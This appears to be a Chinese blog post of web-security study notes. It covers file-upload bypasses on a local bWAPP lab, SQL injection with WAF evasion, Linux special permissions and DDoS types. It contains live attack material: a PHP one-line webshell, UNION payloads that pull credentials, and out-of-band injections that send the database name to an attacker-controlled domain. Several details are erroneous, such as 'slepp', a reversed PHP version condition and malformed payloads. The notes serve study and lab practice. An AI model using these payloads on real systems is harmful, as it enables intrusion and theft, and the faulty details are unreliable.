---
title: "web安全学习笔记"
categories: [ "学习" ]
tags: [ "web安全" ]
draft: false
slug: "145"
date: "2022-04-13 13:50:00"
---

常见web工具：

burpsuite：通过代理渗透，可重放HTTP请求，来分析HTTP响应

curl：通过url方式传输数据，可用于抓取页面（执行请求），监控网络等等

postmain

hackbar quantum

wappalyzer


文件上传漏洞：没有足够的安全约束的情况下，允许上传恶意文件，例如恶意脚本，webshell等等

文件上传漏洞关键点在于绕过

由于法律限制的原因，禁止对其他网站非法攻击，因此需要在本地或者在自己的服务器上建立靶场渗透环境，这边使用的是bwapp（全称为buggy web Application）

这边使用的是docker运行bwapp，也可以下载bwapp，来自己搭建（https://sourceforge.net/projects/bwapp/files/）


docker pull raesene/bwapp

docker run -d -p 0.0.0.0:80:80 raesene/bwapp


访问127.0.0.1/install.php


点击here来初始化，或者直接访问127.0.0.1/install.php?install=yes

创建账号信息，点击new user，或者直接访问127.0.0.1/user_new.php

点击login，或者直接访问127.0.0.1/login.php，根据刚才的账号信息进行登录

简单接触文件上传漏洞

chose your bug选择unrestricted File Upload（未经严格审记的文件上传），安全级别选择low（set your security level）

上传一句话木马，创建shell.php文件，添加<?php @eval($_POST["test"])?>

通过curl触发，执行curl -d 'test=echo getcwd();'  http://127.0.0.1/images/shell.php

可以看到成功触发shell.php，并且服务器返回了当前执行的目录


后缀名绕过

安全级别选择medium（set your security level）

常见后缀名验证方式有，黑名单（禁止哪些后缀上传），白名单（只允许哪些后缀上传）

这里的靶场环境的web server为Apache，因此需要了解Apache解析器模块

.htaccess绕过，当黑名单没有限制上传.htaccess文件时，并且web sever也支持.htaccess时

上传.htaccess文件，内容为：AddType application/x-httpd-php jpg

上传木马，shell.jpg

AddType application/x-httpd-php jpg的意思是，jpg文件按照php文件的方式解析

 
大小写绕过

大小写用于Windows平台环境下，在Windows中，大小写是不敏感的，而在Linux环境下，大小写是敏感的


Windows文件流绕过

利用windows平台的NTFS文件系统的文件流特性，设置文件时，默认使用未命名的文件流，但是也可以创建其他命名的文件流


例如：

    echo hallo,word > hallo.txt:a.txt
    echo hallo > hallo.txt
    echo 666 > hallo.txt::$data

第一个例子中，hallo,word并没有写入到hallo.txt，而是写入到了hallo.txt下的a.txt文件流中

第三个例子中，666写入到了hallo.txt默认文件流中


针对于白名单进行绕过

截断绕过（环境要求：php>5.3.42，magic_quotes_gpc关闭）

搭配burpsuite来拦截http请求

上传shell.php，通过拦截修改请求报文，修改为shell.php$00.jpg

$00在url中会解析为0，而在ASCII中0又表示为字符串结束，因此当url出现$00时，表示字符串读取结束

因此在上传shell.php$00.jpg时，对于先上传后检测的服务端来说，实质上传的是shell.php


---


SQL注入

SQL注入漏洞是用户应用层与数据库层的安全漏洞

发生SQL注入的原因就是用户应用层提供的数据存在恶意SQL语句，当这些恶意SQL语句不被审查就执行的话是非常危险的，例如在一些输入框（比如搜索框）中提交一些恶意SQL语句，因为后端需要根据用户提供的数据来动态的构造SQL查询语句，而且这些动态参数存在恶意SQL语句时又没有进行过滤审查，将导致SQL注入漏洞触发

过程：通过数据库管理系统执行SQL命令，并且将数据库管理系统的执行结果返回给web服务器，web服务器再将结果进行整合成html网页，最后发送给客户端

GET型SQL注入漏洞是指使用GET请求方法进行URL链接拼接，来获取到超越权限的数据

GET型SQL注入漏洞

方法1：利用UNION操作符，并且通过SELECT 1,2,3,4,5来查找可以显示多少字段数据

UNION SELECT 1,user(),database(),table_name,version() FROM INFORMATION_SCHEMA.tables WHERE table_schema=database() --

查找INFORMATION_SCHEMA数据库的tables表的使用了当前数据库用户名，当前数据库名称，当前数据库版本，以及当前数据库的数据表，后面的--是sql注释，也可以使用#来注释掉后面的sql命令

当查找到的数据表存在敏感名称时，例如user时，可对敏感名称的表进行查找


UNION SELECT 1,columns,3,4,5 FROM INFORMATION_SCHEMA.columns WHERE table_name='user' --

通过上面的命令查找user表的字段，当出现password，login等字段时，可以确定为后台的登录密码以及用户

UNION SELECT 1,password,login,4,5 FROM user --

通过上面的命令查找user表的password和login字段

注意：一般来说password字段返回的数据都是加密过的，而且绝大多加密算法都是不可逆的，只能通过彩虹表来碰撞

POST型SQL注入漏洞（主要通过http请求工具，因为post请求不是通过url发送的，http请求工具例如postman或者burpsuite，触发的方法和get型类似）


判断SQL注入点

能够与数据库进行交互，并且可以提交参数到网页时，那么可能存在sql注入

单引号判断法

https://webtest.cjlio.com?id=1'

如果页面报错则存在SQL注入，因为sql会因为单引号个数不成对而导致sql执行错误而报错


判断注入的参数类型（如果参数可以输入非整型，则直接使用字符串型）

整型

SELECT * FROM test where id = and 1=1

字符串型

SELECT * FROM test where id = '1' and '1'='1'


百分号判断法

针对于使用了LIKE关键字的

https://webtest.cjlio.com?id=1$' and '1'='1' --

简单的SQL注入防御方法：

减低错误信息的提供

使用mysql_escape_string($id)转义，将'转义

过滤and，or，union，select等等关键词（黑名单）



SQL注入漏洞主要的类型：布尔型注入，可联合查询注入，基于时间延迟注入，报错型注入，可多语句查询注入


布尔型注入

https://webtest.cjlio.com/?id=1' and substring(version) = 5--

布尔型注入被用于盲注，上面的例子中是通过布尔型注入来判断一下数据库版本是否为5，如果是的，那么将会是正常请求



联合查询注入（使用UNION关键字来拼接自己想要执行的SQL语句）

基于时间延迟注入（通过判断请求响应的时间来得到想要的信息，盲注，当页面不会提供报错信息时，布尔型注入也无效时采用）

https://webtest.cjlio.com/?id=1' and slepp(5)--

slepp函数的作用是当sql语句执行完成后等待指定秒数再去返回执行结果，通过感觉时间来确定该语句是否正常执行


报错型注入（如果页面可以返回sql报错信息时使用，通过报错信息中获取数据）




多语句查询型注入（当页面可以执行多条SQL语句时）

例如：https://webtest.cjlio.com/?id=1; SELECT * FROM test where id =1--

多语句查询型注入可以使用时，很大可能UPDATA数据库更新或者删除数据库可以触发



HTTP头注入

利用http请求头，当web服务器需要从http请求头中获取信息到数据库中时（针对不进行过滤审查就直接进行数据库操作时）

通过http请求工具，例如postman或者burpsuite，修改请求头，重放攻击

User-Agent: abc', (SELECT database()) --




堆叠注入（多条sql命令一起执行）

使用;结束当前sql命令后继续执行下一条sql命令

联合注入和堆叠注入区别：联合注入只能进行查询操作（取决于sql命令的拼接头是查询还是更新还是删除，或者插入），而堆叠注入可以执行任意sql命令

一般实质环境中堆叠注入用不到（可以会出现权限问题），但是一用到就威力无穷



OOB注入（out of band，带外通道技术）


通过生成请求体来攻击，目标服务器接收到恶意的请求体后，进一步处理，处理的过程中目标服务器可能要向外部发送请求或者向外部获取资源，而这个外部实质是攻击者控制的服务器，在进行外部的请求时，将数据一起发送给攻击者控制的服务器，最后在攻击者控制的服务器查看数据（例如：通过dns记录来显示）


https://test1.cjlio.com/?id=1' and SELECT CONCAT('\\\\',(SELECT database(),'.test2.cjlio.com');

https://test1.cjlio.com/?id=1' and  SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database(),'.test2.cjlio.com'));

最后在DNS记录中查看到想要的数据，上面的例子是获取当前的数据库名


利用HTTP协议来OOB注入


https://test1.cjlio.com/?id=1' and  SELECT UTL_HTTP.REQUEST(https://test2.cjlio.com/test.php '||'?id='||(SELECT database())) FROM dual;

上面的例子是通过https://test2.cjlio.com的test.php记录传递的数据，并且写入到test.txt中


混淆和绕过

一般的注入攻击会被WAF检测和过滤掉，而混淆和绕过就是针对WAF防御的手段


过滤词绕过

OR可使用||绕过，AND可使用&&绕过


union被过滤可使用||来绕过，例如：https://test1.cjlio.com/?id=1'  ||(SELECT user FROM usermain limit 1,1) = 'root'


limit被过滤，可通过GROUP BY语句创建一个虚拟表，来绕过，例如：https://test1.cjlio.com/?id=1'  ||  SELECT min(user),id FROM usermain GROUP BY user HAVING user='root'


GROUP BY被过滤，可通过SUBSTR()函数和GROUP_CONCAT()函数绕过，例如：https://test1.cjlio.com/?id=1'  ||  SELECT SUBSTR((SELECT GROUP_CONCAT(user)user FROM usermain),1,1)

 SELECT和引号被过滤，可通过SUBSTR()函数绕过，例如：https://test1.cjlio.com/?id=1'  || SUBSTR(user,1,1=0x72)

空格被过滤，可通过/**/来替代空格来分开sql语句

等号被过滤，可通过like关键字绕过

双写绕过：例如union被过滤，可使用ununionion来替代，当ununionion被union被过滤机制处理后，将中间的union替代为空，导致左右两边合在了一起，从而达到绕过的目的、


双重编码绕过：当某个url编码的参数会被WAF编码过滤时，可对参数进行二次编码，让WAF解第一层编码，但是还有第二层编码，从而达到绕过的目的

编码注入（url编码）：%27表示'，%23表示#，%df表示无意义，%5c表示\，%3d表示=，%2A表示*，例如：https://test1.cjlio.com/?id=1 %df SELECT %2A FROM test where id %3d 1 %23


二次注入：数据库存储的数据并不安全，不应该直接调用数据库的数据，例如admin'#



---

提权


Linux的特殊权限

SUID（Set UID）：除了rwx权限外的s权限，当某个普通用户具备运行具备SUID权限的文件时，那么当运行该文件，将会使用该文件所有者的身份去执行该文件，只要执行一结束，该身份将会消失

例如passwd命令，该命令具备SUID权限，当执行该命令时，将表示使用root身份来执行passwd命令，从而修改/usr/bin/passwd这个密码记录文件（该文件普通用户没有任何权限，当然权限只能限制普通用户，root用户是不会被限制的）

注意：SUID的特性，必须具备可执行权限，而且只对可执行文件有效，目录以及不可执行文件无效，提升权限的效果只在文件执行过程有效，执行结束则身份恢复，s权限必须在所有者权限上（也就是-rws--x--x）


SGID（Set GID）：当s权限出现在所属组中将变成SGID权限，如：-rwx--s--x，同样SGID只对可执行文件有效，而且其他用户具备可执行文件，一样只在执行过程中有效

该特殊权限的特性：在执行该具备SGID特殊权限的可执行文件时，当前用户的组身份将变成文件所属组的身份，赋予的是所属组的权限


注意：SGID对目录也是具备效果的，只不过当目录被赋予SGID权限后，不是执行触发，而且进入该目录就会触发特性，但是前提是该目录对于普通用户具备rwx权限，这样才能发挥SGID在目录的全部功能



SBIT（Stick BIT）：t权限，该特殊权限只对目录有效，当目录具备了SBIT特殊权限后，那么不管用户在该目录下创建的文件还是目录，都是只有该用户和root用户有权限修改和删除


该权限的表示为：drwxrwxrwt，哪怕其他用户具备该目录的全部权限



---




DDOS攻击（分布式拒绝服务攻击）

原理：利用TCP/IP协议族的漏洞，来对目标服务器发送数据流，当超过服务器的处理能力或者服务器的带宽被饱和了，将导致服务器崩溃或者服务器网络崩溃，常见的DDOS攻击有：UDP泛洪攻击，DNS放大攻击，ICMP泛洪攻击，内存缓存放大攻击，SYN泛洪攻击，PING泛洪攻击，NTP放大攻击，ACK泛洪攻击，HTTP泛洪攻击（也就是CC攻击），Slowloris攻击，HTTP Post DDOS攻击等等



UDP泛洪攻击：利用UDP不需要建立连接就可以发送数据包的特性，大量发送UDP数据包给目标服务器的随机端口，当服务器接收到UDP数据包时，如果该端口没有应用在监听接收数据，会给发送方发送一个数据包，来表示目标端口不可用，当量大到一定程度时，服务器将无法对合法数据进行反应，从而达到拒绝服务的目的，对于会给发送方发送数据包，可进行伪造IP地址，不但不会作用到攻击机上，还做到了匿名


DNS放大攻击：利用DNS服务器，对DNS服务器发送DNS请求响应，但是该请求包被伪造成了目标服务器的IP，DNS服务器将会向目标服务器发送大量的数据包，从而造成网络阻塞，来达到拒绝服务的目的


ICMP泛洪攻击：通过不断发送ICMP ECHO REQUEST来对消耗目标服务器的处理器资源和带宽

攻击者控制的僵尸机对目标服务器发送ICMP ECHO REQUEST，目标服务器需要返回ICMP ECHO REPLY，常见的攻击手法有ping



内存缓存放大攻击：利用UDP的特性（不需要连接），当使用伪造IP对目标服务器发送http请求，目标服务器接收到请求后，发送响应到伪造的IP上，当目标服务器无法处理庞大的请求响应时，将会导致服务器崩溃和带宽饱满

放大攻击就是利用了请求包和响应包的体积差，发送小的请求包，需要返回大的响应包，从而达到放大攻击的效果



SYN泛洪攻击和ACK泛洪攻击都是利用TCP的三次握手的特性


SYN泛洪攻击：伪造IP向目标服务器发送SYN包，目标服务器接收到后返回ACK给伪造IP的机子，但是接收ACK的目标是不存在的，如果不对其进行确认ACK的话，目标服务器将该次连接挂起（半连接状态），目标服务器会重复发送ACK给伪造的IP上，当量大时，挂起的连接将会消耗掉目标服务器的资源，导致其崩溃，从而达到拒绝服务攻击的目的

ACK泛洪攻击：向目标服务器发送大量的ACK数据包，实质理论和SYN泛洪攻击类似



HTTP泛洪攻击：发送正常的请求，目标服务器需要返回响应，但是这个正常的请求是有针对性的，针对服务器需要消耗大量资源来做出响应的请求，例如搜索请求


Slowloris攻击：利用HTTP Request的特性，通过\r\n\r\n来表示HTTP请求发送已完成，当\r\n\r\n永远不发送时，目标服务器将会保持TCP连接，并且以一种极低速度来发送数据给目标服务器，让目标服务器认为HTTP Request还没有接收完成从而保持TCP连接，当量大时，目标服务器将被占满TCP连接，从而接收不到新的请求，最后达到拒绝服务攻击的目的

防御Slowloris攻击很简单，限制HTTP Request传输的最大时间，超时将中断连接，并且拉入黑名单



HTTP Post DDOS攻击：和Slowloris攻击类似，一样是慢速攻击，不过是通过指定一个大的content-length，但是发送包的速度很慢，来达到保持连接，消耗目标服务器的资源